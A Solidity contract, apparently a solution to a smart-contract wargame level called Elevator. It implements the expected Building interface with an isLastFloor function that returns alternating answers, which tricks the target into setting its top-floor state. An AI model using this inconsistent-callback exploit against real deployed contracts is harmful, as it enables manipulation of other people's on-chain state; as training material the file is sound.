// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Elevator, Building} from "../Elevator.sol";

contract ElevatorAttacker is Building {
    Elevator elevator;
    address public owner;
    bool isFirstCall = true;

    constructor(Elevator _elevator) {
        elevator = _elevator;
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function isLastFloor(uint256 _floor) external returns (bool) {
        isFirstCall = !isFirstCall;
        return isFirstCall;
    }

    function attack() external onlyOwner {
        elevator.goTo(0);
    }
}
